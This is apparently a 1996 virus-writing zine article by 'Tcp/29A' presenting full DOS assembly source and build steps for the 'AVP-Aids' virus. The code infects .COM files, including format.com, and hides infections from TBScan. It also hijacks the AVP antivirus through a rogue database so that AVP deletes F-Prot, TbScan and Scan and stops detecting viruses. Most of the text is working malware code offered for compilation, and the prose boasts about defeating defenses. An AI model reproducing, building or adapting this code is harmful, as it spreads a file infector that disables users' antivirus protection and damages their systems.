;
;                                             ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹
;          AVP-Aids,                          €€€ €€€ €€€ €€€ €€€ €€€
;          by Tcp/29A                          ‹‹‹€€ﬂ ﬂ€€€€€€ €€€€€€€
;                                             €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€
;                                             €€€€€€€ €€€€€€ﬂ €€€ €€€
;
; AVP is probably the best  antivirus nowadays, but it's the most easily
; foolable too :) One of its best advantages is that the user himself is
; able to write his own detection and  disinfection routines for any new
; virus he  may find. But a  virus author could  use that  facilities to
; write a virus, don't you think? :)
;
; All we need to have is the routine editor (AVPRO) which is included in
; the registrated version of AVP (2.1 and above), or the -older- one in-
; cluded in the shareware version of AVP 2.0, which is the one i used.
;
; This routine editor  gives us a lot of functions and structures we can
; call. For more  info on this, read their  definitions in  a file named
; DLINK.H which is included in AVP.
;
; Having access to the  vectors of those functions, we may either change
; or redirect them as a normal virus  does  with  the standard interrupt
; vectors. We could write trojans, droppers, a stealth routine, and even
; a whole virus... imagination is the only limit you have ;)
;
; As an example of this, i wrote a simple virus which i  named AVP-Aids,
; because it works in the same way as the known disease does:
;
; - It destroys the organism  defenses: deletes F-Prot, TbScan  and Scan
;   when AVP tries to scan them.
; - Favours the appearing of opportunist  diseases: AVP won't detect any
;   virus (only a few  using it heuristic scanner), so any virus, though
;   being a super-old one, will be able to infect the system.
;
; I recommend the reading of  the file USERGUID.DOC which is included in
; the AVP pack for a better comprehension about the way AVP-Aids works.
;
; For getting a working  dropper of AVP-Aids, first compile the next two
; files (tasm /m /ml /q avp_dec.asm; tasm /m /ml /q avp_jmp.asm).
;
; ƒƒƒƒ File: AVP_DEC.ASM ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

aids_decode segment byte public 'CODE'
assume cs:aids_decode

_decode proc far
aids proc far
	push ds
	push bp
	mov bp,seg _Page_A      ; Get AVP's data segment
	mov ds,bp
	les di,ds:_Page_A       ; Get pointer to Page_A
	mov cx,400h             ; Length of Page
	push cx
	mov al,1                ; If al=0 then AVP detects the Win95.Boza.A
				;  in a high number of files... rules :-DDD
	rep stosb               ; Clear Page_A

	les di,ds:_Page_B
	pop cx
	push cx
	rep stosb               ; Clear Page_B

	les di,ds:_Header
	pop cx
	rep stosb               ; Clear Header

	push ds
	pop es
	lds si,ds:_File_Name    ; File scanned
	lodsw
	cmp ax,'-f'             ; Check for F-*.*
	je del_file
	cmp ax,'bt'             ; Check for TBSCAN
	jne check_sc
	lodsw
check_sc:
	cmp ax,'cs'             ; Check for SCAN
	jne no_scan
	lodsw
	cmp ax,'na'
	jne no_scan
del_file:
	push es
	pop ds
	lds dx,ds:_File_Full_Name
	mov ah,41h
	int 21h                 ; Delete file (F-Prot, Scan, TBScan)
no_scan:
	pop bp
	pop ds
	xor ax,ax
	retf                    ; Return to AVP (AX==0 <-> RCLEAN)
aids endp
_decode endp

aids_decode ends

public  _decode
public  aids
extrn   _Page_A:dword
extrn   _Page_B:dword
extrn   _Header:dword
extrn   _File_Name:dword
extrn   _File_Full_Name:dword
end

; ƒƒƒƒ EOF: AVP_DEC.ASM ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;
; ƒƒƒƒ File: AVP_JMP.ASM ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

aids_jmp segment byte public 'CODE'
assume cs:aids_jmp

_jmp proc far
	call far ptr aids       ; call the aids procedure
	retf                    ; Return to AVP
_jmp endp

aids_jmp ends

public  _jmp
extrn   aids:far
end

; ƒƒƒƒ EOF: AVP_JMP.ASM ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;
; Now that we got their corresponding OBJ files, we  load AVPRO and edit
; a new viral database which  we'll name AVP_AIDS.AVB. Add a File regis-
; ter, and write the name  and the commentary you want, it doesn't mind.
; Now we link (Alt-L) an external routine. Choose AVP_DEC.OBJ and accept
; the register.
;
; Because the second OBJ file  makes a call to a procedure  of the first
; one, we will  need AVP to load in memory the database we just created.
; For this we must save this base and add it to the active ones by pres-
; sing F4. Once  we have  done this, we must edit again AVP_AIDS.AVB and
; add a jmp register. Now link AVP_JMP.OBJ as  an external  routine, and
; if everything is right we'll be able to save and exit.
;
; After doing all this, we must compile the  virus itself: for doing it,
; we must modify the database length  equ (length_aids) with the correct
; value and follow the next steps:
;
; tasm /m avp_aids.asm
; tlink avp_aids.obj
; exe2bin avp_aids.exe avp_aids.com
; copy /b 6nops.com+avp_aids.avb+avp_aids.com avp-aids.com
;
; As *all_this* is quite hard to do, Mister Sandman has included a fully
; compiled second generation of this virus in \FILES :)
;
; ƒƒƒƒ File: AVP_AIDS.ASM ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;
; Name:         AVP-Aids
; Author:       Tcp / 29A
; When:         6-April-96 : 1st implementation
;               November-96: Now doesn't hang AVP 2.2x
;
; Where:        Spain
; Comments:     A simple and lame virus to demostrate the
;               AVPRO API capabilities... to make virii... ;)
;               Also fools TBAV... (except this first generation)


LENGTH_AIDS equ 590     ; Place here the length of your base

avp_aids segment byte public
assume cs:avp_aids, ds:avp_aids, ss:avp_aids
org 0

start:
	call get_delta
next:

avp_set db 'AVp.SeT',0
base    db 'KRN386.AVB',13,10
f_base  db 'kRn386.aVb',0
f_mask  db '*.cOm',0
_format db 'c:\DoS\fORmaT.cOM',0

six     db 0cdh,20h,?,?,?,?     ; Original bytes
jmp_vir db 'PK'                 ; Fools TBScan
	pop bx                  ; Fix ('PK'= push ax, dec bx)
	db 0e9h                 ; jmp
ofs_vir dw ?

	db '[AVP-Aids, Tcp / 29A]'

get_delta:
	mov di,100h
	pop bp
	push di
	sub bp,offset(next)     ; Get delta-offset
	mov di,100h
	push di
	lea si,[bp+six]
	movsw
	movsw
	movsw                   ; Restore infected file
	mov ah,2fh
	int 21h                 ; Get DTA
	push es
	push bx
	lea dx,[bp+offset(dta)]
	mov ah,1ah
	int 21h                 ; Set DTA
	mov ah,4eh
	xor cx,cx
	lea dx,[bp+f_mask]
	int 21h                 ; Find-first *.com
	jc check_for_format
	lea dx,[bp+offset(dta)+1eh]
	call infect_file
check_for_format:
	lea dx,[bp+offset(_format)]     ; Try to infect c:\dos\format.com
	call infect_file

	mov ax,3d00h            ; Search for avp.set
	lea dx,[bp+avp_set]
	int 21h
	jc exec_host
	xchg ax,bx
	mov ah,3fh
	lea dx,[bp+dta]
	mov cx,666h             ;-)
	int 21h
	push ax                 ; length(AVP.SET)
	mov ah,3eh
	int 21h                 ; Close file
	mov ah,3ch
	xor cx,cx
	lea dx,[bp+f_base]
	int 21h                 ; Create krn386.avb (viral database)
	xchg ax,bx
	mov ah,40h
	push ax
	lea dx,[bp+base]
	mov cx,offset(f_base)-offset(base)
	int 21h                 ; Write base name in file
	pop ax
	lea dx,[bp+dta]
	pop cx
	int 21h                 ; Write rest of AVP.SET
	mov ah,3eh
	int 21h
	mov ah,41h
	lea dx,[bp+avp_set]
	int 21h                 ; Delete AVP.SET
	mov ah,56h
	mov di,dx
	lea dx,[bp+f_base]
	int 21h                 ; Rename krn386.avb to AVP.SET
	mov ah,3ch
	xor cx,cx
	int 21h                 ; Reset krn386.avb
	xchg ax,bx
	mov ah,40h
	lea dx,[bp+aids_base]
	mov cx,LENGTH_AIDS
	int 21h                 ; Write the AVP-AIDS base
	mov ah,3eh
	int 21h
exec_host:
	pop dx
	pop ds
	mov ah,1ah
	int 21h                 ; Restore DTA
	push cs
	push cs
	pop ds
	pop es
	ret

infect_file:
	mov ax,3d02h
	int 21h                 ; Open
	jc no_file
	xchg ax,bx
	mov ah,3fh
	mov cx,6
	lea dx,[bp+offset(six)]
	int 21h                 ; Read 6 bytes
	cmp ax,cx               ; File >6 bytes?
	jne close_file          ; No? ten jmp
	cmp word ptr [bp+six],'ZM'      ; EXE file but .com extension?
	je close_file                   ; Yes? then jmp
	cmp word ptr [bp+six],'KP'      ; Already infected?
	je close_file                   ; Yes? then jmp
	mov ax,4202h
	cwd
	xor cx,cx
	int 21h                 ; Go end
	mov ah,40h
	mov dx,bp
	mov cx,offset(vir_end)
	int 21h                 ; Write virus
	mov ax,4200h
	cwd
	xor cx,cx
	int 21h                 ; Go start
	mov ax,[bp+offset(dta)+1ah]     ; File size
	sub ax,6
	mov [bp+ofs_vir],ax
	mov ah,40h
	lea dx,[bp+jmp_vir]
	mov cx,6
	int 21h                 ; Write jump to virus
	mov ax,5701h
	mov cx,[bp+offset(dta)+16h]     ; Time
	mov dx,[bp+offset(dta)+18h]     ; Date
	int 21h                         ; Set time/date to original
close_file:
	mov ah,3eh
	int 21h                 ; Close file
no_file:
	ret

aids_base db LENGTH_AIDS dup(?)

vir_end:

dta:

avp_aids ends
	end start
